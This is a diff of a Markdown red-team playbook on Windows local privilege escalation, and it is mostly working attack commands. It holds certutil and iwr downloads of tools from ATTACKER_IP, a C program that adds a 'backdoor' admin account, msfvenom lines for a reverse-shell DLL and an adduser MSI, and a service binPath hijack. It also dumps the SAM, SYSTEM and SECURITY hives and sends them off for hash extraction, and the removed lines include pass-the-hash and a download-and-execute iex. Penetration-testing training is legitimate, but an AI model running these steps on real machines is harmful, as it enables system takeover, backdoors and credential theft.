@@ -1,408 +1,365 @@
 # Windows Privilege Escalation Methodology
 
-Comprehensive reference for Windows privilege escalation covering enumeration, service exploitation, DLL hijacking, scheduled tasks, registry mining, token manipulation, kernel exploits, credential extraction, and automated tooling.
+End-to-end Windows local privilege escalation playbook: situational awareness → automated triage → token/privilege abuse → service/registry/scheduled-task misconfig → credential harvesting → SYSTEM. Grounded in current (2025-2026) tradecraft. Deep dives live in the sibling files: `windows-services-and-registry.md`, `token-and-potato-attacks.md`, `uac-bypass-and-lolbas.md`, and `impacket-reference.md`.
+
+> The fastest Windows privesc is almost always **`whoami /priv` → SeImpersonatePrivilege → a Potato → SYSTEM**, or a credential you found being reused. Service/registry misconfigs come next. Kernel exploits are the last resort.
 
 ---
 
-## Enumeration and Situational Awareness
+## 0. The Mental Model
 
-### Core System Information
+| Trust boundary | What you abuse | Examples |
+|----------------|----------------|----------|
+| **Token privilege** | A privilege grants SYSTEM | SeImpersonate (Potatoes), SeDebug, SeBackup/Restore, SeTakeOwnership, SeLoadDriver |
+| **Service config** | A service runs as SYSTEM and you can influence its binary | weak service ACL, unquoted path, writable binary, weak registry ACL, `binPath=` reconfig |
+| **DLL search order** | A privileged process loads your DLL | DLL hijacking / proxying, PATH dir DLL planting |
+| **Scheduled task** | Task runs as SYSTEM/admin, you control its target | writable task binary/script |
+| **AutoRun / installer** | Elevated execution at logon/install | AutoLogon creds, `AlwaysInstallElevated`, Run keys |
+| **Credentials at rest** | Reuse for a higher principal | LSASS, SAM, DPAPI, creds in registry/files, vault, browsers |
+| **UAC** | Admin-in-token but medium IL → high IL | UAC bypass (fodhelper, etc.) |
+| **Kernel / driver CVE** | Memory bug → SYSTEM | PrintNightmare, vulnerable signed drivers (BYOVD) |
+
+Every section maps to one of these.
+
+---
+
+## 1. Situational Awareness
+
 ```powershell
-whoami
-whoami /groups
+whoami /all                      # user, groups, privileges, integrity level — read ALL of it
+whoami /priv                     # privileges (the money line)
+whoami /groups                   # group SIDs + integrity level (Medium vs High)
+echo %USERNAME% & hostname
+systeminfo                       # OS, build, hotfixes (for kernel CVE matching)
+[System.Environment]::OSVersion.Version
+wmic qfe get HotFixID            # installed patches
+```
+
+Key things to read off `whoami /all`:
+- **Integrity level**: `Mandatory Label\Medium` = limited admin (UAC), `High` = elevated, `System` = done. `Medium` + "Administrators" group present but disabled → **UAC bypass** path.
+- **Privileges**: any of `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, `SeManageVolumePrivilege` = a direct route (see `token-and-potato-attacks.md`).
+- **Groups**: `BUILTIN\Administrators`, `Backup Operators`, `Server Operators`, `DnsAdmins`, `Hyper-V Administrators`, `Print Operators` — several are SYSTEM-equivalent.
+
+```powershell
+# Users / groups / sessions
+net user; net user %USERNAME%
+net localgroup; net localgroup administrators
+Get-LocalGroupMember Administrators
+query user; qwinsta                              # other logged-on sessions
+# Network
+ipconfig /all; route print; arp -a
+netstat -ano | findstr LISTENING                 # loopback-only services = pivot targets
+# AV / EDR present?
+Get-MpComputerStatus | select RealTimeProtectionEnabled,AMServiceEnabled
+sc query windefend; tasklist /svc | findstr /i "defender sense crowd carbon sentinel cylance"
+```
+
+---
+
+## 2. Automated Triage
+
+Run a scanner, then confirm findings by hand. WinPEAS and PrivescCheck are the standards; PowerUp for quick service/registry checks.
+
+### WinPEAS
+```cmd
+:: Download/serve from attacker, fetch over HTTP
+certutil -urlcache -split -f http://ATTACKER_IP/winPEASx64.exe %TEMP%\wp.exe
+%TEMP%\wp.exe > %TEMP%\wp.txt
+:: BAT/PS variants if no exec allowed
+```
+```powershell
+iwr http://ATTACKER_IP/winPEASx64.exe -OutFile $env:TEMP\wp.exe; & $env:TEMP\wp.exe
+```
+
+### PrivescCheck (PowerShell, clean output)
+```powershell
+powershell -ep bypass
+. .\PrivescCheck.ps1
+Invoke-PrivescCheck -Extended
+Invoke-PrivescCheck -Extended -Report PrivescCheck -Format TXT,HTML
+```
+
+### PowerUp (fast targeted)
+```powershell
+. .\PowerUp.ps1
+Invoke-AllChecks
+Get-ModifiableServiceFile          # services with writable binaries
+Get-ModifiableService              # services you can reconfigure
+Get-UnquotedService
+Get-ModifiableScheduledTaskFile
+Get-RegistryAlwaysInstallElevated
+Get-RegistryAutoLogon
+```
+
+### Seatbelt (host survey)
+```powershell
+.\Seatbelt.exe -group=all
+.\Seatbelt.exe -group=user
+```
+
+---
+
+## 3. Token Privilege & Group Abuse (fastest wins)
+
+Full detail in **`token-and-potato-attacks.md`**. Quick map:
+
+```powershell
 whoami /priv
-whoami /all
-hostname
-systeminfo
 ```
 
-### User and Group Enumeration
+| Privilege / Group | Route to SYSTEM |
+|-------------------|-----------------|
+| **SeImpersonatePrivilege** / SeAssignPrimaryTokenPrivilege | **Potato** family (PrintSpoofer, GodPotato, RoguePotato, EfsPotato, DCOMPotato, SigmaPotato) → SYSTEM |
+| **SeDebugPrivilege** | Open/inject any process (LSASS dump, migrate to SYSTEM proc) |
+| **SeBackupPrivilege** (Backup Operators) | Read SAM/SYSTEM/SECURITY or NTDS via shadow copy → offline hashes |
+| **SeRestorePrivilege** | Overwrite protected files / service binaries |
+| **SeTakeOwnershipPrivilege** | Take ownership of a SYSTEM binary, replace it |
+| **SeLoadDriverPrivilege** | Load a vulnerable driver (BYOVD) → kernel |
+| **SeManageVolumePrivilege** | Gain write to C:\ root → DLL/binary plant |
+| **DnsAdmins** | Serve malicious DLL via `dnscmd /config /serverlevelplugindll` → SYSTEM on DC |
+
 ```powershell
-Get-LocalUser
-net user
-net user <username>
-Get-LocalGroup
-Get-LocalGroupMember administrators
-net localgroup
-net localgroup administrators
-```
-
-### Security Context
-```powershell
-# Check integrity level
-whoami /groups | findstr "Mandatory Level"
-
-# Access token information
-whoami /all
-
-# UAC status
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
-```
-
-### Network Information
-```powershell
-ipconfig /all
-route print
-netstat -ano
-```
-
-### Process and Service Enumeration
-```powershell
-Get-Process
-tasklist /svc
-
-# Services with binary paths
-Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
-
-# Services with user context
-Get-CimInstance Win32_Service -Filter "Name='<ServiceName>'" | Select-Object Name, State, StartName, ProcessId, PathName
-
-# Specific service configuration
-sc.exe qc <ServiceName>
-sc.exe queryex <ServiceName>
-```
-
-### Installed Applications
-```powershell
-# 64-bit
-Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-
-# 32-bit
-Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+:: Most common one-liner once you have SeImpersonate:
+PrintSpoofer64.exe -i -c cmd
+GodPotato-NET4.exe -cmd "cmd /c whoami"
 ```
 
 ---
 
-## Sensitive Information Hunting
+## 4. Service Misconfigurations
 
-### File System Search
+Full detail in **`windows-services-and-registry.md`**. Vectors: insecure service ACL (reconfigure `binPath`), writable service executable, unquoted service path, weak service-registry ACL, weak DACL on service binary directory.
+
 ```powershell
-# Password files
-Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+# Enumerate services with non-default binary paths
+Get-CimInstance win32_service | Select Name,State,StartName,PathName |
+  Where-Object {$_.PathName -notlike 'C:\Windows\*'} | Format-Table -Auto
 
-# Configuration files
-Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config -File -Recurse -ErrorAction SilentlyContinue
+# Quick wins from PowerUp:
+Get-ModifiableService; Get-ModifiableServiceFile; Get-UnquotedService
 
-# User documents
-Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+# Check who can reconfigure a service (look for SERVICE_CHANGE_CONFIG / WRITE_DAC):
+accesschk.exe -accepteula -uwcqv "Authenticated Users" *
+accesschk.exe -accepteula -uwcqv %USERNAME% *
+sc.exe qc <ServiceName>; sc.exe sdshow <ServiceName>
 ```
 
-### PowerShell Artifacts
-```powershell
-# PowerShell history
-Get-History
-(Get-PSReadlineOption).HistorySavePath
-type C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-
-# Transcript files
-Get-ChildItem -Path C:\ -Include *transcript* -File -Recurse -ErrorAction SilentlyContinue
-```
-
-### Registry Mining
-```powershell
-# Search for passwords
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
-
-# AutoLogon credentials
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
-```
-
----
-
-## Service Exploitation
-
-### Service Binary Hijacking
-```powershell
-# Find running services with binary paths
-Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
-
-# Check binary permissions
-icacls "C:\path\to\service.exe"
-
-# Check service startup type
-Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'servicename'}
-
-# Replace and restart
-net stop servicename
-net start servicename
-shutdown /r /t 0
-```
-
-### DLL Hijacking
-```powershell
-# Check DLL permissions
-icacls "C:\Program Files\Application\application.dll"
-
-# Use Process Monitor (Procmon) to find missing DLLs
-# Filter: Process Name is application.exe
-# Look for: NAME NOT FOUND results for DLLs
-```
-
-### Unquoted Service Paths
+Exploit pattern (reconfigure binPath):
 ```cmd
-# Find unquoted service paths
-wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
-
-# Check directory permissions
-icacls "C:\Program Files\Vulnerable App\"
+sc config <Svc> binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators %USERNAME% /add" start= auto
+sc stop <Svc> & sc start <Svc>
 ```
 
 ---
 
-## Scheduled Tasks Abuse
+## 5. Registry, AutoRun & Installer Vectors
 
-### Task Enumeration
+```powershell
+# AlwaysInstallElevated (MSI runs as SYSTEM) — both keys must be 1
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Exploit:
+msiexec /quiet /qn /i evil.msi    # evil.msi adds admin (msfvenom -f msi)
+
+# AutoLogon creds in registry
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"
+
+# Run / RunOnce keys with writable targets
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+
+# Weak service registry ACL (write to ImagePath)
+accesschk.exe -accepteula -kvuqsw "Authenticated Users" hklm\System\CurrentControlSet\Services
+```
+
+---
+
+## 6. Scheduled Tasks
+
+```powershell
+schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
+Get-ScheduledTask | Where State -eq Ready | Select TaskName,@{n='Run';e={$_.Principal.UserId}}
+# For tasks running as SYSTEM/admin, check write access to the action's program/script:
+icacls "C:\path\to\task.exe"
+Get-ModifiableScheduledTaskFile     # PowerUp
+```
+If the task target is writable → replace it with your payload → wait/trigger.
+
+---
+
+## 7. DLL Hijacking
+
+Full detail in `windows-services-and-registry.md`. Find a privileged process that loads a DLL from a writable/missing location.
+```powershell
+# Writable directories in PATH (plant DLL there for processes that search PATH)
+$env:PATH -split ';' | % { if (Test-Path $_) { icacls $_ 2>$null } } | findstr /i "Everyone Users Modify (M) (F) (W)"
+# Use Procmon (filter: Result = NAME NOT FOUND, Path ends .dll) to find missing DLLs in a SYSTEM process.
+```
+
+---
+
+## 8. Credential Harvesting
+
+```powershell
+# Files
+Get-ChildItem C:\ -Recurse -Include *.kdbx,*.config,*.xml,unattend.xml,sysprep.inf,web.config,*.rdg -EA 0
+findstr /si password *.txt *.ini *.config *.xml 2>nul
+Get-ChildItem C:\Users\ -Recurse -Include *.txt,*.kdbx,*.ppk,id_rsa -EA 0
+
+# PowerShell history (very high yield)
+type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
+# Registry secrets
+reg query HKLM /f password /t REG_SZ /s 2>nul
+reg query HKCU /f password /t REG_SZ /s 2>nul
+:: VNC, PuTTY, OpenSSH, WinSCP, FileZilla creds in registry/profile
+
+# Unattend / GPP / WSL
+type C:\Windows\Panther\Unattend.xml; type C:\Windows\System32\sysprep\sysprep.xml
+findstr /si cpassword \\domain\SYSVOL\*.xml      # GPP (domain)
+
+# Tooling
+.\lazagne.exe all                                # browsers, wifi, vaults, etc.
+.\SharpDPAPI.exe triage                          # DPAPI-protected creds
+.\Seatbelt.exe -group=credentials
+```
+
+After finding a password, **reuse it**: try `runas`, `net use`, WinRM, RDP, and pass-the-hash if you got a hash. See `08-active-directory/` and `07-password-attacks/`.
+
+### Local hash extraction (need admin or SeBackup)
 ```cmd
-schtasks /query /fo LIST /v
-```
-```powershell
-Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
-```
-
-### Task Analysis
-```powershell
-# Key fields: Run As User, Task To Run, Next Run Time, Author
-# Check executable permissions
-icacls "C:\path\to\scheduled\executable.exe"
+reg save HKLM\SAM %TEMP%\sam & reg save HKLM\SYSTEM %TEMP%\system & reg save HKLM\SECURITY %TEMP%\security
+:: exfil and parse offline:
+impacket-secretsdump -sam sam -system system -security security LOCAL
 ```
 
 ---
 
-## Dangerous Privileges
+## 9. UAC Bypass (Medium → High integrity)
 
-### Check for Exploitable Privileges
+If you are a local admin running at Medium IL (UAC), bypass to High. Full catalog in **`uac-bypass-and-lolbas.md`**.
 ```powershell
-whoami /priv | findstr "SeImpersonatePrivilege\|SeAssignPrimaryTokenPrivilege\|SeBackupPrivilege\|SeDebugPrivilege"
+whoami /groups | findstr /i "S-1-16-8192"   # Medium IL
+:: Common fileless bypasses (auto-elevating binaries + hijacked registry):
+:: fodhelper, computerdefaults, sdclt, eventvwr, computerdefaults, slui
 ```
-
-### Potato Family Exploits (SeImpersonatePrivilege)
-
-| Tool | Target OS |
-|------|-----------|
-| JuicyPotato | Windows Server 2016/2019 |
-| RoguePotato | Windows 10/11 |
-| SweetPotato | Universal |
-| SigmaPotato | Modern Windows |
-| PrintSpoofer | Print Spooler service |
 
 ---
 
-## Kernel Exploits
+## 10. Kernel & Driver Exploits (last resort)
 
-### Enumeration
 ```powershell
-systeminfo
-Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
+systeminfo                                   # OS build + hotfixes
+wmic qfe get HotFixID
+# Windows Exploit Suggester - Next Gen:
+# wesng:  python wes.py systeminfo.txt
 ```
-
-### Notable Kernel Exploits
 
 | CVE | Name | Target |
 |-----|------|--------|
-| MS16-032 | Secondary Logon Handle | Windows 7/8/10, Server 2008-2012 |
-| MS17-017 | GDI Palette Objects | Various |
-| CVE-2021-1675 | PrintNightmare | Windows 10/11, Server 2019 |
-| CVE-2023-29360 | Windows 11 | Windows 11 22H2 |
+| CVE-2021-1675 / CVE-2021-34527 | **PrintNightmare** | Print Spooler RCE/LPE |
+| CVE-2021-36934 | **HiveNightmare/SeriousSAM** | World-readable SAM/SYSTEM |
+| CVE-2022-21882 / CVE-2021-1732 | win32k LPE | Win10/11 |
+| CVE-2023-21768 | afd.sys LPE | Win11 22H2 |
+| CVE-2024-30088 | ntoskrnl TOCTOU LPE | various |
+| BYOVD | vulnerable signed driver (e.g. via SeLoadDriver / loaded by admin) | kernel SYSTEM |
 
----
-
-## Registry Operations and Hash Extraction
-
-### Save Registry Hives
-```cmd
-reg save HKLM\sam sam
-reg save HKLM\system system
-reg save HKLM\security security
-```
-
-### LocalAccountTokenFilterPolicy
 ```powershell
-# Check current value (0 = filtering enabled, 1 = disabled)
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
-
-# Disable UAC remote restrictions
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
-```
-
-### File Transfer via SMB
-```bash
-# Setup SMB server (attacker)
-impacket-smbserver -smb2support share . -username user -password pass
-```
-```cmd
-# Connect from Windows
-net use Z: \\<ATTACKER_IP>\share /user:user pass
-copy sam z:
-copy system z:
-```
-
-### Hash Extraction and Pass-the-Hash
-```bash
-# Dump hashes from registry files
-impacket-secretsdump -sam sam -system system local
-
-# Pass-the-hash
-impacket-psexec 'Administrator'@<TARGET_IP> -hashes :<NTLM_HASH>
-impacket-wmiexec 'Administrator'@<TARGET_IP> -hashes :<NTLM_HASH>
+# HiveNightmare quick check (no admin needed):
+icacls C:\Windows\System32\config\SAM    # if 'BUILTIN\Users:(I)(RX)' => readable!
+:: read via shadow copy: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\System32\config\SAM
 ```
 
 ---
 
-## Payload Generation
+## 11. Payloads & Cross-Compilation
 
-### Malicious Service Binary (C)
 ```c
+// service/payload that adds an admin (add_admin.c)
 #include <stdlib.h>
-int main() {
-    system("net user backdoor Password123! /add");
-    system("net localgroup administrators backdoor /add");
-    return 0;
+int main(){
+  system("net user backdoor P@ssw0rd123! /add");
+  system("net localgroup administrators backdoor /add");
+  return 0;
 }
 ```
-
-### Malicious DLL (C++)
-```cpp
-#include <stdlib.h>
-#include <windows.h>
-BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
-    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-        system("net user backdoor Password123! /add");
-        system("net localgroup administrators backdoor /add");
-    }
-    return TRUE;
-}
-```
-
-### Cross-Compilation
 ```bash
-# Executable
-x86_64-w64-mingw32-gcc payload.c -o payload.exe
-
-# DLL
-x86_64-w64-mingw32-gcc payload.cpp --shared -o payload.dll
+# Cross-compile from Kali:
+x86_64-w64-mingw32-gcc add_admin.c -o add_admin.exe
+x86_64-w64-mingw32-gcc -shared payload.c -o payload.dll      # DLL
+# msfvenom alternatives:
+msfvenom -p windows/x64/exec CMD='net localgroup administrators u /add' -f exe -o s.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f dll -o p.dll
+msfvenom -p windows/adduser USER=bk PASS=P@ss123! -f msi -o evil.msi
 ```
 
 ---
 
-## Automated Enumeration Tools
+## 12. File Transfer (reference)
 
-### WinPEAS
 ```powershell
-iwr -uri http://<ATTACKER_IP>/winPEASx64.exe -OutFile winpeas.exe
-.\winPEASx64.exe > winpeas.txt
-type winpeas.txt
-```
-
-### Lazagne (Password Recovery)
-```powershell
-.\lazagne.exe all > lazagne.txt
-type lazagne.txt
-```
-
-### PrivescCheck
-```powershell
-(new-object net.webclient).downloadstring("http://<ATTACKER_IP>/privesccheck.ps1") | iex
-Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML
-```
-
-### PowerUp
-```powershell
-iwr -uri http://<ATTACKER_IP>/PowerUp.ps1 -Outfile PowerUp.ps1
-powershell -ep bypass
-. .\PowerUp.ps1
-Get-ModifiableServiceFile
-Get-UnquotedService
-Get-ModifiableScheduledTaskFile
-```
-
-### Seatbelt
-```powershell
-.\Seatbelt.exe -group=all
+iwr http://ATTACKER_IP/file -OutFile C:\Windows\Temp\file
+certutil -urlcache -split -f http://ATTACKER_IP/file out.exe
+# SMB (impacket-smbserver on attacker):
+copy \\ATTACKER_IP\share\file C:\Windows\Temp\
+# Base64 inline:
+[IO.File]::WriteAllBytes("out.exe",[Convert]::FromBase64String("BASE64"))
 ```
 
 ---
 
-## Enumeration Scripts
+## 13. Cheatsheet
 
-### PowerShell One-Liners
-```powershell
-# Services outside C:\Windows (potential hijacking targets)
-Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.PathName -notlike "C:\Windows\*"} | Format-Table -AutoSize
+```cmd
+:: TRIAGE
+whoami /all & whoami /priv
+systeminfo & wmic qfe get HotFixID
 
-# Unquoted service paths
-Get-CimInstance -ClassName win32_service | Where-Object {$_.PathName -like "* *" -and $_.PathName -notlike '"*"'} | Select Name,PathName,StartName | Format-Table -AutoSize
+:: AUTO
+winPEASx64.exe
+powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
 
-# PowerShell history files
-Get-ChildItem -Path "C:\Users\" -Include "ConsoleHost_history.txt" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "Found history: $($_.FullName)"; Get-Content $_.FullName }
+:: TOKEN -> SYSTEM (if SeImpersonate)
+PrintSpoofer64.exe -i -c cmd
+GodPotato-NET4.exe -cmd "cmd /c whoami"
+
+:: SERVICE RECONFIG
+accesschk.exe -uwcqv "Authenticated Users" *
+sc config Svc binPath= "cmd /c net localgroup administrators %USERNAME% /add" & sc stop Svc & sc start Svc
+
+:: ALWAYSINSTALLELEVATED
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msiexec /quiet /qn /i evil.msi
+
+:: CREDS
+type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+reg query HKLM /f password /t REG_SZ /s
+lazagne.exe all
+
+:: HASHES (admin)
+reg save HKLM\SAM sam & reg save HKLM\SYSTEM system
+impacket-secretsdump -sam sam -system system LOCAL
 ```
 
-### Registry Keys of Interest
-```powershell
-# AutoLogon, startup programs, services
-$regKeys = @(
-    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
-    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
-    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
-)
-foreach ($key in $regKeys) {
-    Get-ItemProperty -Path $key -ErrorAction SilentlyContinue | Format-List
-}
-```
+### Decision flow
+1. `whoami /all` → privilege/group/IL read.
+2. SeImpersonate? → Potato → SYSTEM (done).
+3. Other dangerous privilege/group? → use it (`token-and-potato-attacks.md`).
+4. Run WinPEAS/PowerUp; verify service & registry misconfigs by hand.
+5. AlwaysInstallElevated / AutoLogon / writable service or task? → exploit.
+6. Hunt credentials (history, registry, files, DPAPI, LSASS) → reuse.
+7. Admin@Medium IL? → UAC bypass.
+8. Nothing? → match build/hotfixes → kernel CVE / BYOVD.
 
 ---
 
-## File Transfer to Target
-```powershell
-iwr -uri http://<ATTACKER_IP>/<tool_name> -OutFile <output_filename>
-```
+## References
 
----
-
-## Quick Reference Tables
-
-### Privilege Levels
-| Level | Description | Access |
-|-------|-------------|--------|
-| Standard User | Limited privileges | User files, basic system info |
-| Local Admin | Administrative rights | System files, services, registry |
-| SYSTEM | Highest privilege | All system resources |
-
-### Key Directories to Check
-| Path | Look For |
-|------|----------|
-| `C:\Users\*\Documents` | Passwords, configs |
-| `C:\Program Files\*` | Writable binaries |
-| `C:\Windows\System32` | DLL hijacking |
-| `C:\inetpub\wwwroot` | Web configs |
-
-### Important Registry Keys
-| Key | Purpose |
-|-----|---------|
-| `HKLM\...\Uninstall` | Installed software |
-| `HKLM\...\Winlogon` | Auto-logon credentials |
-| `HKLM\SYSTEM\CurrentControlSet\Services` | Service configurations |
-
----
-
-## Methodology Summary
-
-1. Run automated enumeration (WinPEAS, PowerUp, Seatbelt)
-2. Check current privileges (`whoami /priv`) -- look for SeImpersonatePrivilege
-3. Enumerate services -- writable binaries, unquoted paths, DLL hijacking
-4. Check scheduled tasks for writable executables
-5. Mine registry and file system for credentials
-6. Check PowerShell history and transcript files
-7. Extract registry hives for offline hash cracking
-8. Search for kernel exploits as a last resort
-
----
-
-## Resources
-
-- LOLBAS Project: https://lolbas-project.github.io/
-- Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
-- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
-- Potato Exploits: https://github.com/ohpe/juicy-potato
+- HackTricks – Windows Local Privilege Escalation — https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
+- PEASS-ng (WinPEAS) — https://github.com/peass-ng/PEASS-ng
+- PrivescCheck — https://github.com/itm4n/PrivescCheck
+- PowerSploit/PowerUp — https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+- Seatbelt / GhostPack — https://github.com/GhostPack/Seatbelt
+- LOLBAS Project — https://lolbas-project.github.io/
+- WES-NG (Windows Exploit Suggester NG) — https://github.com/bitsadmin/wesng
+- InternalAllTheThings – Windows Privesc — https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/
